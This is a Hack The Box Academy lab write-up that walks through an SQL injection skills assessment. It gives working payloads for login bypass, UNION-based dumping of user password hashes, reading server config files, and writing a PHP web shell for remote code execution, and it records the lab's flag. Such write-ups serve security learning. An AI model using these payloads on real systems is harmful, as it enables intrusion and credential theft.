---
slug: "web-skills-assessment-sql-injection-fundamentals"
title: "Skills Assessment - SQL Injection Fundamentals"
competition: "Hack The Box"
category: "Web"
difficulty: "Medium"
date: "2026-11-06"
updated: "2026-11-06"
summary: "This is a Hack The Box module but about SQL Injection. But the last Section is a real challenge like CTF but with quiz based. https://academy.hackthebox.com/app/module/33/ https://academy.hackthebox.com/app/module/33/section/518"
tags: ["SQL INJECTION","SQLI"]
status: "published"
flag: "HTB{go_copy_that_manually_if_you_really_need_it_that_BAD!}"
attachments: []
source: "https://claritys.web.id/writeups/web-skills-assessment-sql-injection-fundamentals"
---

# Skills Assessment - SQL Injection Fundamentals

> This is a Hack The Box module but about SQL Injection. But the last Section is a real challenge like CTF but with quiz based.  https://academy.hackthebox.com/app/module/33/ https://academy.hackthebox.com/app/module/33/section/518

## Recon

This is a `blackboxed` challenge, so we have to analyze it without any source code. If we access the `URL` normally, we have to change the `protocol` from `http` to `https`.

![image.png](/assets/uploads/c009dc06-e8ce-4bdd-9e82-5f9de73f86ce-image.png)

After we successfully access the website, we will landed on login page. Which is there’s an option to `register` (create account), I already tried to log in first but i can’t manage to.

![image.png](/assets/uploads/6f5178be-7d15-416f-9ede-fc74f6a45636-image-1.png)

## Vulnerability

So we try to approach the `register` first. There’s 4 parameter to register, let’s fill these first.

![image.png](/assets/uploads/d35370d1-1887-4e12-bd5d-5059ef5c4a8d-image-2.png)

For the invitation code, there’s a format for that form. Which is the format is `abcd-efgh-1234`, let’s see the request at burpsuite so we can analyze can we bypass that.

![image.png](/assets/uploads/b5faa171-eb28-4d3e-833f-6aeadb88cde7-image-3.png)

I got the reference from this website:

[https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet)

We try for the OR so the output will always true, Let’s add it at the end in the parameter.

![image.png](/assets/uploads/b61fcfaf-d7ee-4e2f-bfdd-2bfea2184900-image-4.png)

I already tried to do all of that but the one that succeed is the fourth one: `') or '1'='1'--`

![image.png](/assets/uploads/1beb8ea6-c364-4960-8219-ee3444deb654-image-5.png)

So we can imagine the query looks like this:

```python
WHERE (OTHER_PARAM AND '$InvitationCode');
```

After we add our payload, the query will turn to this:

```python
WHERE (OTHER_PARAM AND '') or '1'='1'-- ');
```

So the output will `100% TRUE` for the `InvitationCode`.

This is the web looks after logged in:

![image.png](/assets/uploads/19e0d23c-754f-48d9-b172-08f9bcd5a4d8-image-6.png)

Let’s choose the admin, and then there’s search in conversation.

![image.png](/assets/uploads/14a26d55-f459-4581-8a50-af141d7c1704-image-7.png)

Let’s examine and analyze the search in conversation. After i tried to send a request at search in conversation, a new param appears named `q`.

![image.png](/assets/uploads/1fe38bcc-6dc6-424b-81eb-e06f08841710-image-8.png)

Atp just try some `payload` to search.

After some times to searching the `column`, I got the `payload` that’s work.

```python
') UNION SELECT 1 -- -
```

Yaa its the same with the first `payload` so we can `register`.

Then i tried to `extend` the `index` until 4 and it appears the message at `index` no 3.

```python
') UNION SELECT 1,2,3,4 -- -
```

![image.png](/assets/uploads/9deb312a-9cde-4812-a56e-924fe5878f70-image-9.png)

So I want to know where is the database pointed.

```python
') UNION SELECT 1,2,database(),4 -- -
```

![image.png](/assets/uploads/b2851694-cc3d-44eb-8b15-9db165bbd0e5-image-10.png)

We got the output `chattr`. So the database name is `chattr`.

I’m using this payload so we can get the `TABLE` list.

```python
') UNION SELECT 1,2,TABLE_NAME,4 FROM INFORMATION_SCHEMA.tables WHERE table_schema='chattr'-- -
```

This is the outputs:

![image.png](/assets/uploads/97fa0cca-b4e3-4ca6-b41f-ac879755f64e-image-11.png)

So the database named `chattr` have 3 `tables` which are `Users, InvitationCodes, and Messages`. Now let’s check for the information named Users for answering the first Question.

**Q1: What is the password hash for the user 'admin'?**

We use this payload to searching for a column name if there’s only 1 column that’s getting outputed.

```python
' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='users'-- -
```

We can modified it into:

```python
') UNION SELECT 1, 2, group_concat(Username, 0x3a, Password), 4 FROM Users-- -
```

Now we can insert it into the search in conversation.

![image.png](/assets/uploads/6975f0a2-38ab-4e98-a86b-7c37585f184f-image-12.png)

So we got the password hash.

![image.png](/assets/uploads/09e7fac2-229c-4b9d-af53-9614f6c1d0ca-image-13.png)

**Q2: What is the root path of the web application?**

Because in the request there’s an information that this website use nginx as a proxy, the nginx configuration located at `/etc/nginx/nginx.conf`. But the available site located at `/etc/nginx/sites-avaliable/default`.

We can use this payload to open the file.

```python
') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4 -- -
```

![image.png](/assets/uploads/8ed5d5a5-e3e5-4db2-9b20-fa5d68d78b5f-image-14.png)

We got it.

![image.png](/assets/uploads/ce7e0ecd-31fc-452a-9c05-22994bb4458f-image-15.png)

**Q3: Achieve remote code execution, and submit the contents of /flag\_XXXXXX.txt below.**

For this one we can just use this payload:

```python
') UNION SELECT 1,2,'<?php system($_REQUEST[3]); ?>',4 into outfile '/var/www/chattr-prod/rce.php' -- -
```

I’m using the `REQUEST[3]` because index no 3 is where our input got outputted.

![image.png](/assets/uploads/2dbd9de0-5243-40ff-ac46-247abd7640ae-image-16.png)

After that, we can just access the file named `rce.php` that we just made. Don’t forget we are using the param `?3=<command>`.

![image.png](/assets/uploads/2cd10599-8ad0-4932-aec3-0625e409fdf1-image-17.png)

Just like that, we got the RCE. Now let’s search for the flag. Luckly it’s located at `/` so its easy to search. Now we can open the flag.

![image.png](/assets/uploads/c1906528-94b0-40d0-a77d-64a9bbe31a93-image-18.png)

![image.png](/assets/uploads/27f0ccef-6abf-4acc-83da-8d09f24bebab-image-19.png)

GG, good challenge.

![image.png](/assets/uploads/63b4a944-2be5-405c-bff0-c048bf934f53-image-20.png)

## Lessons learned

-   Opening File
    
-   Searching Tables name
    
-   Searching Database name
    
-   RCE
    
-   Inserting a new file
    
-   etc.
    

## Reference for another perspective:

-   [https://safalgautam.medium.com/htb-sql-injection-fundamentals-2025-updated-skills-assessment-b0426de7ca43](https://safalgautam.medium.com/htb-sql-injection-fundamentals-2025-updated-skills-assessment-b0426de7ca43)
